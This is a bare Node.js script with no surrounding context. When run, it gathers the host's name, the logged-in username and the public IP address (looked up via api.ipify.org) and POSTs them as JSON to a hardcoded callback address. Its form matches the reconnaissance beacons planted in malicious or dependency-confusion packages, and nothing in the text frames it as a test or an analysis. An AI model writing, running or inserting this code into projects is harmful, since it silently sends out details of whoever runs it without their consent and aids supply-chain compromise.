const os=require('os'),http=require('http'),https=require('https');
const CALLBACK_HOST="192.0.2.1";
function send(data){const body=JSON.stringify(data);const req=http.request({hostname: CALLBACK_HOST, method:"POST"},()=>{});req.write(body);req.end()}
function main(){const data={host:os.hostname(),user:os.userInfo().username,extip:''};https.get('https://api.ipify.org',res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>{data.extip = d.trim(); send(data);});});} main();
